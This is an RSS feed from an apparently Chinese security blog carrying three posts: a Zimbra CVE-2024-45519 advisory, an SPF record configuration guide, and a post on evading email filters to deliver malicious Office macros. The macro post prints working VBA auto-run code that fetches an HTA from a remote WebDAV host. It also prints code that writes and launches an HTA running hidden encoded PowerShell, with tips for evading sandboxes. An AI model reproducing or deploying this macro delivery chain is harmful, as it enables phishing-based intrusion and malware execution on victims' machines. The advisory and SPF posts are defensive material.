<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>邮件安全 on 办公AI智能小助手</title>
        <link>http://localhost:1313/tags/%E9%82%AE%E4%BB%B6%E5%AE%89%E5%85%A8/</link>
        <description>Recent content in 邮件安全 on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright>
        <lastBuildDate>Sat, 09 Aug 2025 05:30:27 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E9%82%AE%E4%BB%B6%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>安全通告：Zimbra Collaboration Suite远程代码执行漏洞(CVE-2024-45519)技术分析</title>
        <link>http://localhost:1313/p/%E5%AE%89%E5%85%A8%E9%80%9A%E5%91%8Azimbra-collaboration-suite%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2024-45519%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 09 Aug 2025 05:30:27 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%AE%89%E5%85%A8%E9%80%9A%E5%91%8Azimbra-collaboration-suite%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2024-45519%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;摘要&#34;&gt;摘要
&lt;/h3&gt;&lt;p&gt;CVE-2024-45519是Zimbra协作套件postjournal服务中发现的关键安全漏洞。该漏洞目前尚未获得CVSS评分，但允许远程攻击者在受影响系统上执行任意代码，可能导致未授权访问、数据泄露和完全系统沦陷。&lt;/p&gt;
&lt;h3 id=&#34;受影响系统及应用&#34;&gt;受影响系统及应用
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;应用&lt;/strong&gt;：Zimbra Collaboration Suite (ZCS)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;受影响版本&lt;/strong&gt;：8.8.15(至Patch 45)和9.0.0(至Patch 40)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;平台&lt;/strong&gt;：所有支持平台(Linux, Mac OS X)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;技术细节攻击概述&#34;&gt;技术细节/攻击概述
&lt;/h3&gt;&lt;p&gt;CVE-2024-45519是存在于Zimbra协作套件postjournal服务邮件处理模块中的远程代码执行(RCE)漏洞。该漏洞源于未能正确清理用户输入，使得攻击者无需认证即可注入任意命令。攻击者可通过向易受攻击的Zimbra服务器发送特制邮件来绕过用户输入清理机制。&lt;/p&gt;
&lt;p&gt;攻击流程包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;识别运行漏洞版本的Zimbra服务器&lt;/li&gt;
&lt;li&gt;制作包含特定payload的邮件以绕过输入清理&lt;/li&gt;
&lt;li&gt;发送特制邮件至目标服务器，触发任意代码执行&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;修复建议&#34;&gt;修复建议
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;立即更新系统&lt;/strong&gt;：升级至最新修补版本(8.8.15 Patch 46和9.0.0 Patch 41)或更新至10.0.9/10.1.1&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;临时解决方案&lt;/strong&gt;：如无法立即更新，考虑临时禁用或限制postjournal服务访问&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;邮件过滤&lt;/strong&gt;：使用邮件安全网关在邮件到达Zimbra服务器前过滤恶意内容&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;日志监控&lt;/strong&gt;：监控postjournal服务相关日志中的可疑活动&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;通用建议&#34;&gt;通用建议
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;网络隔离&lt;/strong&gt;：将Zimbra服务器与其他网络隔离以降低风险&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;定期补丁&lt;/strong&gt;：实施补丁管理策略确保软件及时更新&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;日志记录&lt;/strong&gt;：启用详细日志记录并监控异常活动&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;用户培训&lt;/strong&gt;：定期培训用户识别钓鱼邮件和基于邮件的攻击&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;备份恢复&lt;/strong&gt;：定期备份Zimbra数据并验证恢复能力&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;参考资料&#34;&gt;参考资料
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Feedly威胁情报报告&lt;/li&gt;
&lt;li&gt;NIST国家漏洞数据库&lt;/li&gt;
&lt;li&gt;Zimbra安全中心&lt;/li&gt;
&lt;li&gt;Dark Reading文章&lt;/li&gt;
&lt;li&gt;Project Discovery文章-Zimbra远程命令执行(CVE-2024-45519)&lt;/li&gt;
&lt;li&gt;Zimbra补丁下载链接：
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://wiki.zimbra.com/wiki/Zimbra_Releases/8.8.15/patch_installation&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://wiki.zimbra.com/wiki/Zimbra_Releases/8.8.15/patch_installation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/patch_installation&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/patch_installation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://wiki.zimbra.com/wiki/Zimbra_Releases/10.0.0/patch_installation&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://wiki.zimbra.com/wiki/Zimbra_Releases/10.0.0/patch_installation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://wiki.zimbra.com/wiki/Zimbra_Releases/10.1.0/patch_installation&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://wiki.zimbra.com/wiki/Zimbra_Releases/10.1.0/patch_installation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>如何绕过邮件过滤器投递恶意宏代码 - 高级渗透测试技巧</title>
        <link>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E9%82%AE%E4%BB%B6%E8%BF%87%E6%BB%A4%E5%99%A8%E6%8A%95%E9%80%92%E6%81%B6%E6%84%8F%E5%AE%8F%E4%BB%A3%E7%A0%81-%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/</link>
        <pubDate>Tue, 05 Aug 2025 20:16:26 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E9%82%AE%E4%BB%B6%E8%BF%87%E6%BB%A4%E5%99%A8%E6%8A%95%E9%80%92%E6%81%B6%E6%84%8F%E5%AE%8F%E4%BB%A3%E7%A0%81-%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/</guid>
        <description>&lt;h1 id=&#34;如何绕过邮件过滤器投递恶意宏代码&#34;&gt;如何绕过邮件过滤器投递恶意宏代码
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;警告&lt;/strong&gt;：本文所述技术可能已过时，不适用于当前环境。但仍可作为学习资料，或用于更新现代工具技术。&lt;/p&gt;
&lt;p&gt;恶意宏代码是有效的攻击技术手段。为防范此类攻击，邮件安全过滤器通常会拦截恶意宏文档。以下是我总结的有效绕过技术：&lt;/p&gt;
&lt;h2 id=&#34;基础技巧使用旧版文档格式&#34;&gt;基础技巧：使用旧版文档格式
&lt;/h2&gt;&lt;p&gt;Ethan Robish(@ethanrobish)传授的标准技巧是将宏文档另存为&amp;quot;Word 97-2003文档&amp;quot;格式。新版Office要求宏文档使用&amp;quot;.docm&amp;quot;扩展名，而旧格式允许使用更隐蔽的&amp;quot;.doc&amp;quot;扩展名。&lt;/p&gt;
&lt;h2 id=&#34;进阶技术webdav投递hta文件&#34;&gt;进阶技术：WebDav投递HTA文件
&lt;/h2&gt;&lt;p&gt;当传统PowerShell Empire、Metasploit等方法失效时，以下宏代码可通过WebDav服务器获取HTA文件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Sub AutoOpen()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Debugging
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;End Sub
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Sub Document_Open()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Debugging
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;End Sub
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Public Function Debugging() As Variant
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Set shellApp = CreateObject(&amp;#34;Shell.Application&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    shellApp.Open (&amp;#34;\\your.webdavserver.net\webdav\updater.hta&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;End Function
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该代码使用较少受监控的&amp;quot;Shell.Application Open&amp;quot;方法。需将&amp;quot;your.webdavserver.net&amp;quot;替换为实际WebDav服务器地址。&lt;/p&gt;
&lt;h2 id=&#34;hta文件生成方法&#34;&gt;HTA文件生成方法
&lt;/h2&gt;&lt;p&gt;使用PowerShell Empire等工具生成HTA文件：&lt;/p&gt;
&lt;h2 id=&#34;受限环境应对方案&#34;&gt;受限环境应对方案
&lt;/h2&gt;&lt;p&gt;当目标无法联网时，可将HTA写入特定用户目录（如c:\Users\croberts\），该路径在沙箱中不存在但能在真实环境生效：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Function&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Bhistest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;As&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Variant&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Dim&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Str&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;As&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;String&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Dim&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Str2&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;As&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;String&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;script&amp;gt;var c= &amp;#39;powershell.exe -NoP -sta -NonI -W Hidden -Enc &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;...省略编码命令...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Str2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;new ActiveXObject(&amp;#39;WScript.Shell&amp;#39;).Run(c,0);&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;script&amp;gt;self.close();&amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;objFSO&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CreateObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Scripting.FileSystemObject&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;objFile&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;objFSO&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateTextFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;c:\users\croberts&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;inal.hta&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;objFile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;vbCrLf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;objFile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Str2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;objFile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Close&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellApp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CreateObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Shell.Application&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;shellApp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Open&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;c:\users\croberts&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;inal.hta&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;End&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Function&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;防御建议&#34;&gt;防御建议
&lt;/h2&gt;&lt;p&gt;企业真的需要允许接收来自外部的宏文档吗？这始终是高风险操作。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>SPFv1配置指南：全面解析邮件发送者策略框架</title>
        <link>http://localhost:1313/p/spfv1%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97%E5%85%A8%E9%9D%A2%E8%A7%A3%E6%9E%90%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%E8%80%85%E7%AD%96%E7%95%A5%E6%A1%86%E6%9E%B6/</link>
        <pubDate>Mon, 04 Aug 2025 14:24:11 +0800</pubDate>
        
        <guid>http://localhost:1313/p/spfv1%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97%E5%85%A8%E9%9D%A2%E8%A7%A3%E6%9E%90%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%E8%80%85%E7%AD%96%E7%95%A5%E6%A1%86%E6%9E%B6/</guid>
        <description>&lt;h1 id=&#34;如何配置spfv1大众版详解&#34;&gt;如何配置SPFv1：大众版详解
&lt;/h1&gt;&lt;p&gt;&lt;em&gt;&lt;em&gt;Kent Ickler和Derrick Rauch&lt;/em&gt; //&lt;/em&gt;*&lt;/p&gt;
&lt;h2 id=&#34;防晒系数&#34;&gt;防晒系数？
&lt;/h2&gt;&lt;p&gt;等等&amp;hellip;搞错了。
是&lt;strong&gt;发送者策略框架&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;1997届的女士们先生们，记得擦防晒霜&amp;hellip;现在我要给出我的建议：&amp;rdquo;&lt;/p&gt;
&lt;p&gt;当今网络中存在邮件&amp;quot;伪造&amp;quot;现象（感谢@ustayready）。发送者策略框架（SPF）最早可追溯至2005年（RFC 4408），最新版本于2014年更新（RFC 7208），并与DKIM和DMARC共同更新。它试图通过为收件邮件服务器提供一种方法，来判断电子邮件是否来自FROM字段中域名的授权发送者，从而阻止伪造邮件。收件邮件服务器因此能够判断入站邮件更可能是伪造/钓鱼邮件还是合法邮件。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果收件服务器收到的邮件FROM地址来自SPF授权服务器，则有理由认为是有效/&amp;ldquo;好&amp;quot;邮件&lt;/li&gt;
&lt;li&gt;如果来自未授权服务器，则有理由认为是无效/恶意邮件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SPF记录还能&amp;quot;告知&amp;quot;收件服务器如何处理未授权邮件：继续投递、标记为可疑（提高风险评级）或直接拒绝。当然，SPF记录并非金科玉律，收件服务器可自行决定如何权衡SPF记录。&lt;/p&gt;
&lt;h2 id=&#34;营销人员的困境&#34;&gt;营销人员的困境
&lt;/h2&gt;&lt;p&gt;营销人员常为此头疼。这是SendGrid、MailGun、MailChimp等工具带来的难题。他们购买了 fancy 的新营销邮件工具，但人们总把他们的营销邮件标记为垃圾邮件！如果营销团队没有确保FROM域名的SPF记录准确，接收方可能更容易将邮件视为垃圾/恶意邮件，永远消失在垃圾箱中。&lt;/p&gt;
&lt;h2 id=&#34;前瞻思考&#34;&gt;前瞻思考
&lt;/h2&gt;&lt;p&gt;发送者策略框架并未过时，但在反垃圾邮件和反钓鱼领域有了新伙伴。DKIM和DMARC是扩展SPF验证功能的新框架，共同构建域名所有者与收件服务器间的信任网络。请关注我们未来关于DMARC和DKIM的博客文章。&lt;/p&gt;
&lt;h2 id=&#34;域名服务器记录&#34;&gt;域名服务器记录
&lt;/h2&gt;&lt;p&gt;授权邮件服务器/中继发送邮件的SPF记录是DNS TXT记录，必须添加在注册商指定的名称服务器上。由于这涉及域名所有权，它允许域名所有者告知收件方：收到带有其域名的邮件是否来自预期的邮件服务器。&lt;/p&gt;
&lt;p&gt;下文讨论的DNS记录必须在域名注册商的NS记录定义的名称服务器上创建。&lt;/p&gt;
&lt;h2 id=&#34;语法详解&#34;&gt;语法详解
&lt;/h2&gt;&lt;p&gt;虽然有许多工具可帮助构建SPF记录，但您仍需了解其原理。SMTP收件方从左到右读取SPF记录，首次匹配后即停止分析并返回配置结果。&lt;/p&gt;
&lt;p&gt;DNS记录类型 = TXT&lt;br&gt;
主机 = @（您的主TLD或要保护的域名）&lt;br&gt;
值 = [语法]!!&lt;/p&gt;
&lt;p&gt;值字段是记录的核心部分，让我们仔细看看：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;quot;v=spf1&amp;quot; [机制-动作] [机制-对象] [机制-动作] [机制-对象]...&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;机制-动作&#34;&gt;机制-动作
&lt;/h3&gt;&lt;p&gt;动作参数告知收件服务器如何处理：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;+&lt;/code&gt; 通过：SPF记录指定主机已授权（接受邮件）&lt;br&gt;
&lt;code&gt;-&lt;/code&gt; 拒绝：SPF记录指定主机未授权（拒绝邮件）&lt;br&gt;
&lt;code&gt;~&lt;/code&gt; 软失败：SPF记录指定主机未授权但&amp;hellip;也许吧（标记/提高风险）&lt;br&gt;
&lt;code&gt;?&lt;/code&gt; 中立：SPF记录表示不清楚（接受邮件）&lt;/p&gt;
&lt;h3 id=&#34;机制-对象&#34;&gt;机制-对象
&lt;/h3&gt;&lt;p&gt;选项众多：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;all&lt;/code&gt; 所有服务器，任何地方&lt;br&gt;
&lt;code&gt;ip4:&amp;lt;邮件服务器IP地址&amp;gt;&lt;/code&gt;&lt;br&gt;
&lt;code&gt;ip4:&amp;lt;IP地址&amp;gt;/CIDR格式&lt;/code&gt;&lt;br&gt;
&lt;code&gt;ip6:&amp;lt;IPv6地址&amp;gt;&lt;/code&gt;&lt;br&gt;
&lt;code&gt;ip6:&amp;lt;IP地址&amp;gt;/CIDR格式&lt;/code&gt;&lt;br&gt;
&lt;code&gt;a:[域名]&lt;/code&gt; 包含[某域名]的所有A记录&lt;br&gt;
&lt;code&gt;a:[域名]/CIDR&lt;/code&gt; 包含[某域名]所有A记录的/CIDR网络&lt;br&gt;
&lt;code&gt;a&lt;/code&gt; 包含本域所有A记录&lt;br&gt;
&lt;code&gt;a/CIDR&lt;/code&gt; 包含本域所有A记录的/CIDR网络&lt;br&gt;
&lt;code&gt;mx&lt;/code&gt; 包含本域所有MX记录&lt;br&gt;
&lt;code&gt;mx/CIDR&lt;/code&gt; 包含本域所有MX记录的/CIDR网络&lt;br&gt;
&lt;code&gt;mx:[域名]&lt;/code&gt; 包含[某域名]所有MX记录&lt;br&gt;
&lt;code&gt;mx:[域名]/CIDR&lt;/code&gt; 包含[某域名]所有MX记录的/CIDR网络&lt;br&gt;
&lt;code&gt;ptr&lt;/code&gt; 包含本域PTR记录的IP&lt;br&gt;
&lt;code&gt;ptr:[域名]&lt;/code&gt; 包含[某域名]PTR记录的IP&lt;br&gt;
&lt;code&gt;exists:[域名]&lt;/code&gt; YES/NO触发器。如果A记录存在=通过&lt;br&gt;
&lt;code&gt;redirect:[域名]&lt;/code&gt; 用[域名]的SPF记录替换整个SPF记录&lt;br&gt;
&lt;code&gt;include:[域名]&lt;/code&gt; 包含[域名]的SPF记录。匹配=通过，不匹配=失败。这种记录通常用于Google、Office等大型邮件提供商，以及SendGrid、MailGun等邮件中继。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;include:&lt;/code&gt;是一种信任机制，允许您将对域名/组织邮件发送的授权信任代理给您认可的负责发送邮件的另一个域名/组织的SPF记录。这些组织通常会在SPF记录中涵盖其所有可能的邮件服务器。&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;v=spf1 +mx -all&lt;/code&gt;&lt;br&gt;
接受来自本域MX记录的邮件，拒绝其他所有来源。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v=spf1 +a:AnotherDomain.com ?a:google.com -all&lt;/code&gt;&lt;br&gt;
